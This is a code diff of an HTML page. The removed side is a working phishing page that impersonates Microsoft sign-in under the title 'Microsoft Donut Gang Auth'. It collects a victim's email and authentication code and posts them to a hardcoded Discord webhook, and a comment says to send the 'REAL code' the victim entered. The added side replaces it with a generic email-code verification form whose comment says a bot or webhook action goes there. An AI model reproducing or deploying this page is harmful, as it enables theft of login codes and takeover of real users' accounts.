@@ -1,81 +1,86 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Microsoft Donut Gang Auth</title>
-    <style>
-        body {
-            font-family: Arial;
-            background: #0d0d0d;
-            color: white;
-            text-align: center;
-            margin-top: 100px;
-        }
-        input, button {
-            padding: 12px;
-            margin: 5px;
-            font-size: 18px;
-            border-radius: 6px;
-        }
-        button {
-            background: #00a2ff;
-            color: white;
-            border: none;
-            cursor: pointer;
-        }
-        #codeBox {
-            display: none;
-        }
-    </style>
+<meta charset="UTF-8">
+<title>Email + Code Verification</title>
+<style>
+body { font-family: Arial; display: flex; flex-direction: column; align-items: center; margin-top: 100px; }
+input, button { padding: 10px; margin: 5px; font-size: 16px; }
+#codeForm { display: none; }
+</style>
 </head>
 <body>
 
-<h1>Microsoft Donut Gang Auth</h1>
+<h2 id="title">Enter your email</h2>
 
-<div id="step1">
-    <p>Enter your Microsoft Email</p>
-    <input type="email" id="email" placeholder="email@example.com">
-    <button onclick="continueToCode()">Next</button>
+<div id="emailForm">
+  <input type="email" id="email" placeholder="you@example.com" required>
+  <button onclick="sendEmail()">Send Code</button>
 </div>
 
-<div id="codeBox">
-    <p>Enter the Microsoft App Auth Code</p>
-    <input type="text" id="mscode" maxlength="10">
-    <button onclick="submitToWebhook()">Verify</button>
+<div id="codeForm">
+  <input type="text" id="code" placeholder="Enter code" required>
+  <button onclick="verifyCode()">Verify Code</button>
 </div>
+
+<p id="status"></p>
 
 <script>
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1489412320340873316/N40FGYid4PxIEsmI9P4biXJlhjmQqvnIDxCxbByKcJWZUWHaAb9Roc3SzsrRymzFLMqq";
+let userEmail = '';
 
-// Step 1 — ask for email
-function continueToCode() {
-    const email = document.getElementById("email").value;
-    if (!email) return alert("Please enter a valid email.");
+async function sendEmail() {
+    const emailInput = document.getElementById('email').value;
+    if (!emailInput) { alert("Enter your email!"); return; }
 
-    window.userEmail = email;
+    userEmail = emailInput;
+    document.getElementById('status').innerText = "Sending code...";
 
-    document.getElementById("step1").style.display = "none";
-    document.getElementById("codeBox").style.display = "block";
+    try {
+        const res = await fetch('/send-code', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ email: userEmail })
+        });
+
+        const data = await res.json();
+        if (data.success) {
+            document.getElementById('status').innerText = "Code sent! Check your email.";
+            document.getElementById('emailForm').style.display = 'none';
+            document.getElementById('codeForm').style.display = 'block';
+            document.getElementById('title').innerText = "Enter the code you received";
+        } else {
+            document.getElementById('status').innerText = "Error: " + data.message;
+        }
+    } catch (err) {
+        document.getElementById('status').innerText = "Network error.";
+        console.error(err);
+    }
 }
 
-// Step 2 — user enters Microsoft code
-function submitToWebhook() {
-    const code = document.getElementById("mscode").value;
+async function verifyCode() {
+    const codeInput = document.getElementById('code').value;
+    if (!codeInput) { alert("Enter your code!"); return; }
 
-    if (!code) return alert("Enter the authentication code.");
+    document.getElementById('status').innerText = "Verifying code...";
 
-    // Send the REAL code they entered to your webhook
-    fetch(WEBHOOK_URL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-            content: `🔐 **New Microsoft Auth Attempt**\n📧 Email: ${window.userEmail}\n🔢 Code Entered: **${code}**`
-        })
-    });
+    try {
+        const res = await fetch('/verify-code', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ email: userEmail, code: codeInput })
+        });
 
-    alert("Code submitted! We'll process your Microsoft account shortly.");
-
-    // Optional redirect
-    // window.location.href = "/processing";
+        const data = await res.json();
+        if (data.success) {
+            document.getElementById('status').innerText = "Code verified! Action triggered.";
+            // Trigger your bot/webhook action here
+        } else {
+            document.getElementById('status').innerText = "Invalid code!";
+        }
+    } catch (err) {
+        document.getElementById('status').innerText = "Network error.";
+        console.error(err);
+    }
 }
 </script>
 
